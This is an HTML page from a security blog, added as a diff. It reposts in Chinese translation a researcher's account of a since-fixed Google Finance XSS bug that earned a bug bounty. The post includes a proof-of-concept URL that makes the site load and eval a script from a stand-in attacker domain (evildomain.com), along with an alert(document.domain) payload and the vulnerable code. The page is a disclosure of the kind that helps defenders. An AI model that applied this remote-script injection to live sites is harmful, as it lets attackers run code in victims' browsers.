@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+  <title>转载 我是如何在谷歌财经发现一个XSS漏洞，并且拿到了5千美元奖励 | Blog of Secer</title>
+  <meta name="description" content="" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="MobileOptimized" content="320" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
+  <link rel="stylesheet" type="text/css" href="/css/style.css" />
+  <meta name="generator" content="Blog of Secer">
+
+  
+  
+  
+
+  
+</head>
+
+<!--
+<body class="post-template">
+-->
+<body class="home-template">
+<div id="perspective" class="perspective effect-movedown">
+  <div class="container">
+    <!-- wrapper -->
+    <div class="wrapper">
+
+      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
+    <div class="vertical">
+        <div class="site-head-content inner">
+             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
+            <h1 class="blog-title">Blog of Secer</h1>
+            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
+        </div>
+    </div>
+</header>
+
+      
+
+<main class="content" role="main">
+  <article class="post">
+    <span class="post-meta">
+      <time datetime="2013-10-17T19:19:21.000Z" itemprop="datePublished">
+          2013-10-18
+      </time>
+    
+    
+    | 
+    <a href='/tag/xss/'>xss</a>
+    
+    
+</span>
+    <h1 class="post-title">转载 我是如何在谷歌财经发现一个XSS漏洞，并且拿到了5千美元奖励</h1>
+    <section class="post-content">
+      <p>7月30日看到 Michele Spagnuolo 发的博文称“他在 Google Finance 上发现并提交了一个 <a href="http://Ha.Cker.In/tag/XSS" target="_blank">XSS</a> 漏洞，谷歌安全团队确认并修复了该漏洞。Michele 因此拿到了 5K 美元奖励。” 以下是 Michele 博文的译文。</p>  <p>这个问题出现在Google Finance中(google.com/finance)。它能欺骗Javascript的走势图应用（源文件为/finance/f/sfe-opt.js)，让其载入一个托管在外部域上的文件，然后通过eval()方法将该文件内容转换成Javascript代码并执行。</p>  <p>这个过程不需要用户交互，只要点击一下URL就可以了。</p>  <p>复现步骤：</p>  <p>1）点击该URL（目前已修复）：</p>  <p><a href="https://www.google.com/finance?chdet=1214596800000&amp;q=NASDAQ:INTC&amp;ntsp=2&amp;ntrssurl=https:/evildomain.com/x.js." target="_blank" rel="external">https://www.google.com/finance?chdet=1214596800000&amp;q=NASDAQ:INTC&amp;ntsp=2&amp;ntrssurl=https://evildomain.com/x.js.</a></p>  <p>文件x.js包含下列验证代码用来演示:</p>  <p>1 alert(document.domain);</p>  <p>该文件必须通过https来托管。</p>  <p>2）远程Javascript被执行。</p>  <p>工作原理</p>  <p>以下是 /finance/f/sfe-opt.js中的两个代码片段，它们引起了这个安全问题。</p>  <pre>c<b>.</b>push<b>(</b>&quot;ntsp=&quot;<b>);</b></pre><br><br><pre>c<b>.</b>push<b>(</b>b<b>);</b></pre><br><br><pre><b>if</b> <b>(</b>b <b>==</b> Vl<b>.</b>jj <b>||</b> b <b>==</b> Vl<b>.</b>kj<b>)</b> a <b>=</b> a<b>.</b>xc<b>[</b>ii<b>(</b>a<b>.</b>S<b>)],</b> a<b>.</b>lj<b>()</b> <b>||</b> <b>(</b>c<b>.</b>push<b>(</b>&quot;&amp;ntrssurl=&quot;<b>),</b> c<b>.</b>push<b>(</b>escape<b>(</b>a<b>.</b>Cc <b>||</b> &quot;&quot;<b>)));</b></pre><br><br><pre><b>return</b> c<b>.</b>join<b>(</b>&quot;&quot;<b>)</b></pre><br><br><p>在上面这段代码中，URL参数，更确切的说是ntrssurl参数（用户RSS源的地址）被获取并进行了连接。</p>
+
+<pre>Xi<b>.</b>prototype<b>.</b>send <b>=</b> <b>function</b> <b>(</b>a<b>,</b> b<b>,</b> c<b>,</b> d<b>)</b> <b>{</b></pre>
+
+<pre>&#160;&#160;&#160; a <b>=</b> a <b>||</b> <b>null</b><b>;</b></pre>
+
+<pre>&#160;&#160;&#160; d <b>=</b> d <b>||</b> &quot;_&quot; <b>+</b> <b>(</b>Yi<b>++</b><b>).</b>toString<b>(</b><b>36</b><b>)</b> <b>+</b> x<b>().</b>toString<b>(</b><b>36</b><b>);</b></pre>
+
+<pre>&#160;&#160;&#160; n<b>.</b>_callbacks_ <b>||</b> <b>(</b>n<b>.</b>_callbacks_ <b>=</b> <b>{});</b></pre>
+
+<pre>&#160;&#160;&#160; <b>var</b> e <b>=</b> <b>this</b><b>.</b>$s<b>.</b>Z<b>();</b></pre>
+
+<pre>&#160;&#160;&#160; <b>if</b> <b>(</b>a<b>)</b></pre>
+
+<pre>&#160;&#160;&#160;&#160;&#160;&#160;&#160; <b>for</b> <b>(</b><b>var</b> f <b>in</b> a<b>)</b> a<b>.</b>hasOwnProperty <b>&amp;&amp;</b> <b>!</b>a<b>.</b>hasOwnProperty<b>(</b>f<b>)</b> <b>||</b> Fi<b>(</b>e<b>,</b> f<b>,</b> a<b>[</b>f<b>]);</b></pre>
+
+<pre>&#160;&#160;&#160; b <b>&amp;&amp;</b> <b>(</b>n<b>.</b>_callbacks_<b>[</b>d<b>]</b> <b>=</b> Zi<b>(</b>d<b>,</b> b<b>),</b> Fi<b>(</b>e<b>,</b> <b>this</b><b>.</b>Zs<b>,</b> &quot;_callbacks_.&quot; <b>+</b> d<b>));</b></pre>
+
+<pre>&#160;&#160;&#160; b <b>=</b> Wi<b>(</b>e<b>.</b>toString<b>(),</b> <b>{</b></pre>
+
+<pre>&#160;&#160;&#160;&#160;&#160;&#160;&#160; timeout<b>:</b> <b>this</b><b>.</b>We<b>,</b></pre>
+
+<pre>&#160;&#160;&#160;&#160;&#160;&#160;&#160; Ns<b>:</b> <b>!</b><b>0</b></pre>
+
+<pre>&#160;&#160;&#160; <b>});</b></pre>
+
+<pre>&#160;&#160;&#160; Si<b>(</b>b<b>,</b> <b>null</b><b>,</b> $i<b>(</b>d<b>,</b> a<b>,</b> c<b>),</b> <b>void</b> <b>0</b><b>);</b></pre>
+
+<pre>&#160;&#160;&#160; <b>return</b> <b>{</b></pre>
+
+<pre>&#160;&#160;&#160;&#160;&#160;&#160;&#160; La<b>:</b> d<b>,</b></pre>
+
+<pre>&#160;&#160;&#160;&#160;&#160;&#160;&#160; Du<b>:</b> b</pre>
+
+<pre>&#160;&#160;&#160; <b>}</b></pre>
+
+<pre><b>};</b></pre>
+
+<p>第二段代码负责在外部域中查询新闻源以将内容显示在走势图中。</p>
+
+<p>它生成一个回调函数名，以字串 “?<em>CALLBACK</em>”结尾。函数Wi对URL中的ntrssurl参数中的域名执行xmlhttprequest操作。</p>
+
+<p>然后，返回了一段简单的Javascript代码，并且通过eval()方法将其执行。</p>
+
+<p><a href="http://img.cker.in/XSS5_9F0E/clip_image001.jpg" target="_blank" rel="external"><img title="clip_image001" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="564" alt="clip_image001" src="http://img.cker.in/XSS5_9F0E/clip_image001_thumb.jpg" width="894" border="0"></a>触发XSS漏洞的截图</p>
+
+<p><a href="http://img.cker.in/XSS5_9F0E/clip_image002.jpg" target="_blank" rel="external"><img title="clip_image002" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="150" alt="clip_image002" src="http://img.cker.in/XSS5_9F0E/clip_image002_thumb.jpg" width="610" border="0"></a><br><br>  <br>callback 请求截图</p>
+
+<p><a href="http://img.cker.in/XSS5_9F0E/clip_image003.jpg" target="_blank" rel="external"><img title="clip_image003" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="192" alt="clip_image003" src="http://img.cker.in/XSS5_9F0E/clip_image003_thumb.jpg" width="658" border="0"></a></p>
+
+<p>有漏洞的代码片段</p>
+
+<p>这个安全隐患很快就被修复了，我因此得到了5000美元的奖励。</p>
+
+<p>非常感谢，Google安全小组！</p>
+    </section>
+    <footer class="post-footer">
+      <section class="author">
+    <h4>Secer</h4>
+    <p>记录互联网安全历程与个人成长经历</p>
+</section>
+      <section class="share">
+    <h4>Share this post</h4>
+    <a class="icon-sina-weibo" href="http://v.t.sina.com.cn/share/share.php?title=记录互联网安全历程与个人成长经历 ?url=http://ha.cker.in/1035.seo/" target="_blank">
+        <span class="hidden">weibo</span>
+    </a>
+    <a class="icon-twitter" href="http://twitter.com/share?url=http://ha.cker.in/1035.seo/"
+       onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <span class="hidden">Twitter</span>
+    </a>
+    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://ha.cker.in/1035.seo/"
+       onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <span class="hidden">Facebook</span>
+    </a>
+    <a class="icon-google-plus" href="https://plus.google.com/share?url=http://ha.cker.in/1035.seo/"
+       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+        <span class="hidden">Google+</span>
+    </a>
+</section>
+
+    </footer>
+  </article>
+  <nav class="pagination" role="pagination">
+    
+    <a class="newer-posts" href="/1036.seo/">
+        ← 攻击JavaWeb应用 1 -JavaEE 基础
+    </a>
+    
+    <span class="icon-logo">•</span>
+    
+    <a class="older-posts" href="/1034.seo/">
+        WordPress Woopra插件任意文件上传+远程代码执行 →
+    </a>
+    
+</nav>
+
+  <div id="comment" class="comments-area">
+    <h4 class="title"><a href="#disqus_comments" name="disqus_comments">Comments</a></h4>
+    
+</div>
+
+</main>
+
+
+      
+<footer class="site-footer">
+  
+  <div class="inner">
+     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
+     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
+  </div>
+</footer>
+
+      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
+<script type="text/javascript" src="/js/index.js"></script>
+<script type="text/javascript" src="/js/menu.js"></script>
+
+
+
+
+
+  </div>
+</div>
+
+<nav  class="outer-nav top horizontal">
+
+          <a class="icon-home"  href="/"><span>Home</span></a>
+
+          <a class="icon-news"  href="/archives"><span>Archive</span></a>
+
+          <a class="icon-image"  href="/images"><span>Images</span></a>
+
+          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
+
+          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
+
+          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
+
+</nav>
+
+</div>
+</body>
+</html>
